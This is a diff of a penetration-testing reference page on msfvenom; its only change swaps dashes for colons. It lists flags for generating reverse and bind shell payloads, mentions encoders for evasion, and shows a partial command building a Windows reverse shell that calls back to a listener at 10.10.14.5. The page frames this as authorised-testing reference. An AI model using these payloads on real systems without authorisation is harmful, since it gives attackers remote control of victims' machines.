@@ -8,7 +8,7 @@ services: []
 ports: []
 tags: [payloads, shellcode, reverse-shell, encoders]
 attack: [T1587.001, T1059]
-summary: The Metasploit payload generator. Produces reverse and bind shells in the format the target can run — exe, elf, war, aspx, raw shellcode — ready to pair with a listener. The standard way to make a payload for an authorised test.
+summary: The Metasploit payload generator. Produces reverse and bind shells in the format the target can run: exe, elf, war, aspx, raw shellcode: ready to pair with a listener. The standard way to make a payload for an authorised test.
 references:
   - msfvenom documentation | https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
   - Metasploit Unleashed: msfvenom | https://www.offsec.com/metasploit-unleashed/msfvenom/
@@ -20,14 +20,14 @@ Exploitation found a way to run a file or code, and you need the file: a Windows
 
 ## Key flags
 
-- `-p` — the payload (e.g. `windows/x64/meterpreter/reverse_tcp`).
-- `LHOST=` / `LPORT=` — your listener address and port (payload options go as `KEY=value`).
-- `-f` — output format: `exe`, `elf`, `war`, `aspx`, `raw`, `psh`, `python`.
-- `-o file` — write to a file (otherwise stdout).
-- `-a` / `--platform` — architecture and platform.
-- `-e` / `-i` — encoder and iterations (evasion; modern defences see through most).
-- `-b "\x00\x0a"` — bad characters to avoid in shellcode.
-- `--list payloads|formats|encoders` — list what is available.
+- `-p`: the payload (e.g. `windows/x64/meterpreter/reverse_tcp`).
+- `LHOST=` / `LPORT=`: your listener address and port (payload options go as `KEY=value`).
+- `-f`: output format: `exe`, `elf`, `war`, `aspx`, `raw`, `psh`, `python`.
+- `-o file`: write to a file (otherwise stdout).
+- `-a` / `--platform`: architecture and platform.
+- `-e` / `-i`: encoder and iterations (evasion; modern defences see through most).
+- `-b "\x00\x0a"`: bad characters to avoid in shellcode.
+- `--list payloads|formats|encoders`: list what is available.
 
 ## Commands
 
@@ -66,4 +66,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b "\x00\x0a\x0
 
 ## Notes
 
-A *staged* payload (`.../meterpreter/reverse_tcp`) needs the Metasploit handler; a *stageless* one (`reverse_winhttps`, `shell_reverse_tcp`) is self-contained and easier with `nc`. Built-in encoders (`shikata_ga_nai`) rarely beat modern EDR — treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.
+A *staged* payload (`.../meterpreter/reverse_tcp`) needs the Metasploit handler; a *stageless* one (`reverse_winhttps`, `shell_reverse_tcp`) is self-contained and easier with `nc`. Built-in encoders (`shikata_ga_nai`) rarely beat modern EDR: treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.
